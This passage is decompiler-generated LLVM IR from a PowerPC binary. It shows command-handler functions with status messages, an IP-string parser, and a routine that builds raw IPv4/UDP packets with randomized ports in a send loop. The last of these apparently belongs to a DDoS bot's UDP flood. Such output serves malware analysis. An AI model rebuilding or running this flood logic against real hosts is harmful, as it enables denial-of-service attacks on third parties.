  %v0_100017f8 = phi i32 [ %v5_100017b8, %dec_label_pc_100017a4 ], [ %v5_1000177c, %dec_label_pc_10001768 ], [ %v5_100017e0, %dec_label_pc_100017c0 ]
  ret i32 %v0_100017f8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100017e4, { 2, 0, 1 }
}

define i32 @function_100017fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100017fc:
  %v3_10001824 = icmp eq i32 %arg3, 1
  br i1 %v3_10001824, label %dec_label_pc_10001894, label %dec_label_pc_1000182c

dec_label_pc_1000182c:                            ; preds = %dec_label_pc_100017fc
  %v5_10001840 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1000d6cc.53 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10001848 = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10001850 = icmp eq i8 %v3_10001848, 0
  %. = select i1 %v3_10001850, i32 ptrtoint ([28 x i8]* @global_var_1000d6f4.55 to i32), i32 ptrtoint ([9 x i8]* @global_var_1000d6e8.54 to i32)
  %v7_1000188c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1000d710.56 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001958

dec_label_pc_10001894:                            ; preds = %dec_label_pc_100017fc
  %v3_10001898 = load i8, i8* @global_var_1001045c.9, align 1
  %v3_100018a0 = icmp eq i8 %v3_10001898, 0
  br i1 %v3_100018a0, label %dec_label_pc_100018c4, label %dec_label_pc_100018a8

dec_label_pc_100018a8:                            ; preds = %dec_label_pc_10001894
  %v5_100018bc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000d734.58 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_100018c4:                            ; preds = %dec_label_pc_10001894
  %v1_100018c8 = add i32 %arg4, 4
  %v1_100018cc = inttoptr i32 %v1_100018c8 to i32*
  %v2_100018cc = load i32, i32* %v1_100018cc, align 4
  store i32 %v2_100018cc, i32* @r3, align 4
  %v0_100018d4 = call i32 @function_10007288()
  %tmp13 = icmp ult i32 %v0_100018d4, 255
  br i1 %tmp13, label %dec_label_pc_10001900, label %dec_label_pc_100018e4

dec_label_pc_100018e4:                            ; preds = %dec_label_pc_100018c4
  %v5_100018f8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1000d754.60 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_10001900:                            ; preds = %dec_label_pc_100018c4
  store i8 1, i8* @global_var_1001045c.9, align 1
  store i32 268441896, i32* @lr, align 4
  %v3_10001924 = call i32 @function_100071a4(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32 0, i32 256)
  %v2_10001930 = load i32, i32* %v1_100018cc, align 4
  %v2_10001940 = inttoptr i32 %v2_10001930 to i8*
  %v3_10001940 = call i32 @function_10007268(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i8* %v2_10001940)
  %v5_10001954 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1000d77c.63 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %arg4)
  br label %dec_label_pc_10001958

dec_label_pc_10001958:                            ; preds = %dec_label_pc_100018e4, %dec_label_pc_100018a8, %dec_label_pc_1000182c, %dec_label_pc_10001900
  %v0_1000196c = phi i32 [ %v5_100018f8, %dec_label_pc_100018e4 ], [ %v5_100018bc, %dec_label_pc_100018a8 ], [ %v7_1000188c, %dec_label_pc_1000182c ], [ %v5_10001954, %dec_label_pc_10001900 ]
  ret i32 %v0_1000196c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10001958, { 3, 0, 1, 2 }
}

define i32 @function_10001970(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001970:
  %v3_10001998 = icmp eq i32 %arg3, 1
  br i1 %v3_10001998, label %dec_label_pc_10001a08, label %dec_label_pc_100019a0

dec_label_pc_100019a0:                            ; preds = %dec_label_pc_10001970
  %v5_100019b4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1000d79c.64 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100019bc = load i8, i8* @global_var_1001045c.9, align 1
  %v3_100019c4 = icmp eq i8 %v3_100019bc, 0
  %. = select i1 %v3_100019c4, i32 ptrtoint ([28 x i8]* @global_var_1000d6f4.55 to i32), i32 ptrtoint ([9 x i8]* @global_var_1000d6e8.54 to i32)
  %v7_10001a00 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1000d710.56 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a08:                            ; preds = %dec_label_pc_10001970
  %v3_10001a0c = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10001a14 = icmp eq i8 %v3_10001a0c, 0
  br i1 %v3_10001a14, label %dec_label_pc_10001a1c, label %dec_label_pc_10001a38

dec_label_pc_10001a1c:                            ; preds = %dec_label_pc_10001a08
  %v5_10001a30 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1000d7b8.66 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a38:                            ; preds = %dec_label_pc_10001a08
  %v1_10001a3c = add i32 %arg4, 4
  %v1_10001a40 = inttoptr i32 %v1_10001a3c to i32*
  %v2_10001a40 = load i32, i32* %v1_10001a40, align 4
  store i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32* @r3, align 4
  store i32 %v2_10001a40, i32* @r4, align 4
  %v2_10001a50 = call i32 @function_10007710(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32 %v2_10001a40)
  %v3_10001a58 = icmp eq i32 %v2_10001a50, 0
  br i1 %v3_10001a58, label %dec_label_pc_10001a7c, label %dec_label_pc_10001a60

dec_label_pc_10001a60:                            ; preds = %dec_label_pc_10001a38
  %v5_10001a74 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1000d7d8.68 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a7c:                            ; preds = %dec_label_pc_10001a38
  store i8 0, i8* @global_var_1001045c.9, align 1
  %v5_10001a9c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000d7f4.70 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001aa0:                            ; preds = %dec_label_pc_10001a60, %dec_label_pc_10001a1c, %dec_label_pc_100019a0, %dec_label_pc_10001a7c
  %v0_10001ab4 = phi i32 [ %v5_10001a74, %dec_label_pc_10001a60 ], [ %v5_10001a30, %dec_label_pc_10001a1c ], [ %v7_10001a00, %dec_label_pc_100019a0 ], [ %v5_10001a9c, %dec_label_pc_10001a7c ]
  ret i32 %v0_10001ab4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10012b24.62 to i32), { 0, 3, 2, 1 }
  uselistorder i8* @global_var_1001045c.9, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10001aa0, { 3, 0, 1, 2 }
}

define i32 @function_10001ab8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001ab8:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001ab8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001ab8, i32* %stack_var_-320, align 4
  %v3_10001ae4 = icmp eq i32 %arg3, 1
  br i1 %v3_10001ae4, label %dec_label_pc_10001b20, label %dec_label_pc_10001aec

dec_label_pc_10001aec:                            ; preds = %dec_label_pc_10001ab8
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v5_10001b00 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1000d814.71 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i8* null, i8** @global_var_10010460.15, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10010464.16, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b20:                            ; preds = %dec_label_pc_10001ab8
  %v1_10001b24 = add i32 %arg4, 4
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v1_10001b28 = inttoptr i32 %v1_10001b24 to i32*
  %v2_10001b28 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b28, i32* @r3, align 4
  %v0_10001b30 = call i32 @function_10007288()
  %tmp30 = icmp ult i32 %v0_10001b30, 17
  br i1 %tmp30, label %dec_label_pc_10001b5c, label %dec_label_pc_10001b40

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b20
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v5_10001b54 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_1000d834.72 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b5c:                            ; preds = %dec_label_pc_10001b20
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v2_10001b64 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b64, i32* %r9.global-to-local, align 4
  %v2_10001b68 = ptrtoint i32* %stack_var_-300 to i32
  %v2_10001b74 = inttoptr i32 %v2_10001b64 to i8*
  %v3_10001b74 = call i32 @function_10007268(i32 %v2_10001b68, i8* %v2_10001b74)
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001b80 = call i32 @function_10007288()
  %v2_10001b8c = ptrtoint i32* %stack_var_-312 to i32
  %v1_10001b88 = add i32 %v2_10001b8c, -1
  %v2_10001b90 = add i32 %v1_10001b88, %v0_10001b80
  store i32 %v2_10001b90, i32* %r9.global-to-local, align 4
  %v1_10001b94 = add i32 %v2_10001b90, 12
  %v2_10001b94 = inttoptr i32 %v1_10001b94 to i8*
  %v3_10001b94 = load i8, i8* %v2_10001b94, align 1
  %v3_10001b9c = icmp eq i8 %v3_10001b94, 46
  br i1 %v3_10001b9c, label %dec_label_pc_10001ba4, label %dec_label_pc_10001c10.preheader

dec_label_pc_10001ba4:                            ; preds = %dec_label_pc_10001b5c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001bac = call i32 @function_10007288()
  %v2_10001bbc = add i32 %v1_10001b88, %v0_10001bac
  store i32 %v2_10001bbc, i32* %r9.global-to-local, align 4
  %v3_10001bc4 = add i32 %v2_10001bbc, 12
  %v4_10001bc4 = inttoptr i32 %v3_10001bc4 to i8*
  store i8 0, i8* %v4_10001bc4, align 1
  br label %dec_label_pc_10001c10.preheader

dec_label_pc_10001c10.preheader:                  ; preds = %dec_label_pc_10001b5c, %dec_label_pc_10001ba4
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c8 = call i32 @function_10007288()
  %v2_10001c2410 = icmp eq i32 %v0_10001c1c8, 0
  br i1 %v2_10001c2410, label %dec_label_pc_10001c2c, label %dec_label_pc_10001bdc

dec_label_pc_10001bdc:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-304.014 = phi i32 [ %v1_10001c08, %dec_label_pc_10001c04 ], [ 0, %dec_label_pc_10001c10.preheader ]
  %stack_var_-308.113 = phi i32 [ %stack_var_-308.0, %dec_label_pc_10001c04 ], [ 1, %dec_label_pc_10001c10.preheader ]
  %v2_10001be4 = add i32 %stack_var_-304.014, %v2_10001b8c
  store i32 %v2_10001be4, i32* %r9.global-to-local, align 4
  %v1_10001be8 = add i32 %v2_10001be4, 12
  %v2_10001be8 = inttoptr i32 %v1_10001be8 to i8*
  %v3_10001be8 = load i8, i8* %v2_10001be8, align 1
  %v3_10001bf0 = icmp eq i8 %v3_10001be8, 46
  br i1 %v3_10001bf0, label %dec_label_pc_10001bf8, label %dec_label_pc_10001c04

dec_label_pc_10001bf8:                            ; preds = %dec_label_pc_10001bdc
  store i32 %stack_var_-308.113, i32* %r9.global-to-local, align 4
  %v1_10001bfc = add i32 %stack_var_-308.113, 1
  br label %dec_label_pc_10001c04

dec_label_pc_10001c04:                            ; preds = %dec_label_pc_10001bdc, %dec_label_pc_10001bf8
  %stack_var_-308.0 = phi i32 [ %v1_10001bfc, %dec_label_pc_10001bf8 ], [ %stack_var_-308.113, %dec_label_pc_10001bdc ]
  store i32 %stack_var_-304.014, i32* %r9.global-to-local, align 4
  %v1_10001c08 = add i32 %stack_var_-304.014, 1
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c = call i32 @function_10007288()
  %v2_10001c24 = icmp ult i32 %v1_10001c08, %v0_10001c1c
  br i1 %v2_10001c24, label %dec_label_pc_10001bdc, label %dec_label_pc_10001c2c

dec_label_pc_10001c2c:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-308.1.lcssa = phi i32 [ 1, %dec_label_pc_10001c10.preheader ], [ %stack_var_-308.0, %dec_label_pc_10001c04 ]
  %v1_10001c30 = sub i32 4, %stack_var_-308.1.lcssa
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c4 = icmp sgt i32 %v1_10001c30, 0
  %v4_10001c8c6 = icmp eq i32 %v1_10001c30, 0
  br i1 %v2_10001c8c4, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c44:                            ; preds = %dec_label_pc_10001c2c, %dec_label_pc_10001c44
  %storemerge27 = phi i32 [ %v1_10001c7c, %dec_label_pc_10001c44 ], [ 0, %dec_label_pc_10001c2c ]
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c50 = call i32 @function_10007288()
  %v2_10001c58 = add i32 %v2_10001b68, %v0_10001c50
  store i32 %v2_10001c58, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v3_10001c70 = inttoptr i32 %v2_10001c58 to i16*
  store i16 11824, i16* %v3_10001c70, align 2
  %v0_10001c74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001c74 = trunc i32 %v0_10001c74 to i8
  %v2_10001c74 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001c74 = add i32 %v2_10001c74, 2
  %v4_10001c74 = inttoptr i32 %v3_10001c74 to i8*
  store i8 %v1_10001c74, i8* %v4_10001c74, align 1
  %v1_10001c7c = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c = icmp slt i32 %v1_10001c7c, %v1_10001c30
  br i1 %v2_10001c8c, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c44, %dec_label_pc_10001c2c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v2_10001c9c = call i32 @function_100079f8(i32 %v2_10001b68, i32 %v1_10001c30)
  store i32 %v2_10001c9c, i32* %stack_var_-312, align 4
  br i1 %v4_10001c8c6, label %dec_label_pc_10001cb4, label %dec_label_pc_10001cc4

dec_label_pc_10001cb4:                            ; preds = %dec_label_pc_10001c94
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cc4:                            ; preds = %dec_label_pc_10001c94
  %v2_10001ccc = call i32 @function_10000d98(i32 256, i32 %v1_10001c30)
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10001ce0.pre = load i32, i32* %stack_var_-312, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cdc:                            ; preds = %dec_label_pc_10001cb4, %dec_label_pc_10001cc4
  %v0_10001d0017 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  %v3_10001ce0 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v3_10001ce0.pre, %dec_label_pc_10001cc4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  store i32 %storemerge, i32* @global_var_10010464.16, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v4_10001ce4 = inttoptr i32 %v3_10001ce0 to i8*
  store i8* %v4_10001ce4, i8** @global_var_10010460.15, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001ce8:                            ; preds = %dec_label_pc_10001b40, %dec_label_pc_10001aec, %dec_label_pc_10001cdc
  %v0_10001d00 = phi i32 [ %v5_10001b54, %dec_label_pc_10001b40 ], [ %v5_10001b00, %dec_label_pc_10001aec ], [ %v0_10001d0017, %dec_label_pc_10001cdc ]
  %v2_10001ce8 = load i32, i32* %stack_var_-320, align 4
  store i32 %v2_10001ce8, i32* %r11.global-to-local, align 4
  ret i32 %v0_10001d00

; uselistorder directives
  uselistorder i32 %v2_10001ccc, { 1, 0 }
  uselistorder i32 %v2_10001c9c, { 1, 0, 2 }
  uselistorder i32 %v1_10001c7c, { 1, 0 }
  uselistorder i32 %v1_10001c30, { 3, 6, 5, 4, 0, 1, 2 }
  uselistorder i32 %stack_var_-308.113, { 2, 0, 1 }
  uselistorder i32 %stack_var_-304.014, { 1, 2, 0 }
  uselistorder i32 %v2_10001b68, { 3, 2, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32)* @function_10000d98, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001ce8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c44, { 1, 0 }
  uselistorder label %dec_label_pc_10001c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10001c04, { 1, 0 }
  uselistorder label %dec_label_pc_10001bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c10.preheader, { 1, 0 }
}

define i32 @function_10001d04(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001d04:
  store i32 268442920, i32* @lr, align 4
  %v1_10001d24 = call i32 @function_10007b20(i32 %arg2)
  store i32 %v1_10001d24, i32* @global_var_1001046c.76, align 4
  %v4_10001d40 = icmp eq i32 %v1_10001d24, -1
  br i1 %v4_10001d40, label %dec_label_pc_10001d48, label %dec_label_pc_10001dbc

dec_label_pc_10001d48:                            ; preds = %dec_label_pc_10001d04
  store i32 268442960, i32* @lr, align 4
  %v2_10001d4c = call i32 @function_10007b54(i32 %arg2, i32 -1)
  %v3_10001d5c = icmp eq i32 %v2_10001d4c, 0
  br i1 %v3_10001d5c, label %dec_label_pc_10001d64, label %dec_label_pc_10001d90

dec_label_pc_10001d64:                            ; preds = %dec_label_pc_10001d48
  %v3_10001d68 = load i32, i32* @global_var_10010478.10, align 4
  %v6_10001d84 = call i32 @function_1000041c(i32 %v3_10001d68, i32 ptrtoint ([33 x i8]* @global_var_1000d884.77 to i32), i32 %arg1, i32 %arg2)
  %v0_10001d8c = call i32 @function_10008dd8()
  br label %dec_label_pc_10001d90

dec_label_pc_10001d90:                            ; preds = %dec_label_pc_10001d48, %dec_label_pc_10001d64
  %v1_10001d94 = add i32 %v2_10001d4c, 16
  %v2_10001d94 = inttoptr i32 %v1_10001d94 to i32*
  %v3_10001d94 = load i32, i32* %v2_10001d94, align 4
  %v1_10001d98 = inttoptr i32 %v3_10001d94 to i32*
  %v2_10001d98 = load i32, i32* %v1_10001d98, align 4
  %v1_10001da8 = add i32 %v2_10001d4c, 12
  %v2_10001da8 = inttoptr i32 %v1_10001da8 to i32*
  %v3_10001da8 = load i32, i32* %v2_10001da8, align 4
  store i32 %v3_10001da8, i32* @r5, align 4
  store i32 268443068, i32* @lr, align 4
  %v4_10001db8 = call i32 @function_10007700(i32 %v2_10001d98, i32 ptrtoint (i32* @global_var_1001046c.76 to i32), i32 %v3_10001da8, i32 %v2_10001d4c)
  %v3_10001dc0.pre = load i32, i32* @global_var_1001046c.76, align 4
  br label %dec_label_pc_10001dbc

dec_label_pc_10001dbc:                            ; preds = %dec_label_pc_10001d04, %dec_label_pc_10001d90
  %v3_10001dc0 = phi i32 [ %v1_10001d24, %dec_label_pc_10001d04 ], [ %v3_10001dc0.pre, %dec_label_pc_10001d90 ]
  ret i32 %v3_10001dc0

; uselistorder directives
  uselistorder i32 %v3_10001da8, { 1, 0 }
  uselistorder i32 %v2_10001d4c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10001dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10001d90, { 1, 0 }
}

define i32 @function_10001de0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001de0:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1508 = alloca i32, align 4
  %stack_var_-1516 = alloca i32, align 4
  %stack_var_-1536 = alloca i32, align 4
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @function_10004d80(i32 0)
  %v1_10001e20 = call i32 @function_100004f0(i32 %arg2)
  %v3_10001e28 = icmp eq i32 %v1_10001e20, 0
  br i1 %v3_10001e28, label %dec_label_pc_10001e30, label %dec_label_pc_10002108

dec_label_pc_10001e30:                            ; preds = %dec_label_pc_10001de0
  store i32 268443200, i32* @lr, align 4
  %v3_10001e3c = call i32 @function_1000806c(i32 2, i32 3, i32 255)
  %tmp32 = icmp sgt i32 %v3_10001e3c, -1
  br i1 %tmp32, label %dec_label_pc_10001e5c, label %dec_label_pc_10001e54

dec_label_pc_10001e54:                            ; preds = %dec_label_pc_10001e30
  %v0_10001e58 = call i32 @function_10008dd8()
  br label %dec_label_pc_10001e5c

dec_label_pc_10001e5c:                            ; preds = %dec_label_pc_10001e30, %dec_label_pc_10001e54
  %v2_10001e60 = icmp sgt i32 %arg3, 2
  br i1 %v2_10001e60, label %dec_label_pc_10001e88, label %dec_label_pc_10001e68

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001e5c
  %v5_10001e7c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d8a8.79 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10001e84 = call i32 @function_10008dd8()
  br label %dec_label_pc_10001e88

dec_label_pc_10001e88:                            ; preds = %dec_label_pc_10001e5c, %dec_label_pc_10001e68
  %v1_10001e8c = add i32 %arg4, 4
  %v1_10001e90 = inttoptr i32 %v1_10001e8c to i32*
  %v2_10001e90 = load i32, i32* %v1_10001e90, align 4
  store i32 268443296, i32* @lr, align 4
  %v3_10001e9c = call i32 @function_10001d04(i32 %arg2, i32 %v2_10001e90, i32 %v1_10001e8c)
  %v1_10001eac = add i32 %arg4, 8
  %v1_10001eb0 = inttoptr i32 %v1_10001eac to i32*
  %v2_10001eb0 = load i32, i32* %v1_10001eb0, align 4
  store i32 268443324, i32* @lr, align 4
  %v2_10001eb8 = inttoptr i32 %v2_10001eb0 to i8*
  %v3_10001eb8 = call i32 @function_10008c10(i8* %v2_10001eb8, i32 %v1_10001eac)
  %v1_10001ec8 = add i32 %arg4, 12
  %v1_10001ecc = inttoptr i32 %v1_10001ec8 to i32*
  %v2_10001ecc = load i32, i32* %v1_10001ecc, align 4
  store i32 268443352, i32* @lr, align 4
  %v2_10001ed4 = inttoptr i32 %v2_10001ecc to i8*
  %v3_10001ed4 = call i32 @function_10008c10(i8* %v2_10001ed4, i32 %v1_10001ec8)
  %v2_10001ee0 = ptrtoint i32* %stack_var_-1536 to i32
  %v2_10001eec = ptrtoint i32* %stack_var_-1516 to i32
  %tmp33 = bitcast i32* %stack_var_-1516 to i16*
  %v2_10001ef8 = ptrtoint i32* %stack_var_-1508 to i32
  store i32 268443408, i32* @lr, align 4
  %v3_10001f0c = call i32 @function_100071a4(i32 %v2_10001ef8, i32 10, i32 1472)
  %v2_10001f18 = load i32, i32* %v1_10001e90, align 4
  %v6_10001f34 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1000d8d0.81 to i32), i32 %arg2, i32 %v2_10001f18)
  %v1_10001f44 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10001f44, i32* %stack_var_-1536, align 4
  %v1_10001f58 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10001f58, i32* %stack_var_-1536, align 4
  %v3_10001f68 = or i32 %v2_10001ee0, 1
  %v4_10001f68 = inttoptr i32 %v3_10001f68 to i8*
  store i8 0, i8* %v4_10001f68, align 1
  %v3_10001f74 = or i32 %v2_10001ee0, 2
  %v4_10001f74 = inttoptr i32 %v3_10001f74 to i16*
  store i16 1500, i16* %v4_10001f74, align 2
  %v3_10001f80 = add i32 %v2_10001ee0, 6
  %v4_10001f80 = inttoptr i32 %v3_10001f80 to i16*
  store i16 0, i16* %v4_10001f80, align 2
  %v3_10001f8c = add i32 %v2_10001ee0, 9
  %v4_10001f8c = inttoptr i32 %v3_10001f8c to i8*
  store i8 17, i8* %v4_10001f8c, align 1
  %v3_10001f98 = add i32 %v2_10001ee0, 8
  %v4_10001f98 = inttoptr i32 %v3_10001f98 to i8*
  store i8 64, i8* %v4_10001f98, align 4
  %v2_10001fa4 = add i32 %v2_10001ee0, 16
  %v3_10001fa4 = inttoptr i32 %v2_10001fa4 to i32*
  store i32 %v3_10001e9c, i32* %v3_10001fa4, align 4
  %v1_10001fac = urem i32 %tmp10, 65536
  store i32 %v1_10001fac, i32* @r3, align 4
  %v1_10001fb4 = call i32 @function_100079f4(i32 %v1_10001fac)
  %v1_10001fc0 = trunc i32 %v1_10001fb4 to i16
  %v3_10001fc0 = add i32 %v2_10001eec, 4
  %v4_10001fc0 = inttoptr i32 %v3_10001fc0 to i16*
  store i16 %v1_10001fc0, i16* %v4_10001fc0, align 4
  store i32 2, i32* %stack_var_-1552, align 4
  %v3_10001fec = icmp eq i32 %v3_10001eb8, 0
  %v3_10002024 = or i32 %v2_10001eec, 2
  %v4_10002024 = inttoptr i32 %v3_10002024 to i16*
  %v2_10002034 = bitcast i32* %stack_var_-1536 to i16*
  %v3_10002040 = add i32 %v2_10001eec, 6
  %v4_10002040 = inttoptr i32 %v3_10002040 to i16*
  %v2_10002050 = add i32 %v2_10001ee0, 12
  %v3_10002050 = inttoptr i32 %v2_10002050 to i32*
  %v3_10002064 = add i32 %v2_10001ee0, 4
  %v4_10002064 = inttoptr i32 %v3_10002064 to i16*
  %v3_10002080 = add i32 %v2_10001ee0, 10
  %v4_10002080 = inttoptr i32 %v3_10002080 to i16*
  %v2_10002094 = ptrtoint i32* %stack_var_-1552 to i32
  %v2_100020dc = add i32 %v3_10001ed4, %v1_10001e10
  %v1_10001ff8 = urem i32 %v3_10001eb8, 65536
  br label %dec_label_pc_10001fd4

dec_label_pc_10001fd4:                            ; preds = %dec_label_pc_100020f8, %dec_label_pc_10001e88
  %stack_var_-1560.0 = phi i32 [ 0, %dec_label_pc_10001e88 ], [ %v1_100020fc, %dec_label_pc_100020f8 ]
  store i32 268443608, i32* @lr, align 4
  %v0_10001fd4 = call i32 @function_100086d8()
  %v1_10001fe4 = trunc i32 %v0_10001fd4 to i16
  store i16 %v1_10001fe4, i16* %tmp33, align 4
  br i1 %v3_10001fec, label %dec_label_pc_10002014, label %dec_label_pc_10001ff4

dec_label_pc_10001ff4:                            ; preds = %dec_label_pc_10001fd4
  store i32 %v1_10001ff8, i32* @r3, align 4
  %v1_10002000 = call i32 @function_100079f4(i32 %v1_10001ff8)
  %extract.t = trunc i32 %v1_10002000 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002014:                            ; preds = %dec_label_pc_10001fd4
  store i32 268443672, i32* @lr, align 4
  %v0_10002014 = call i32 @function_100086d8()
  %extract.t41 = trunc i32 %v0_10002014 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002028:                            ; preds = %dec_label_pc_10001ff4, %dec_label_pc_10002014
  %v1_10002004.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10001ff4 ], [ %extract.t41, %dec_label_pc_10002014 ]
  store i16 %v1_10002004.sink.off0, i16* %v4_10002024, align 2
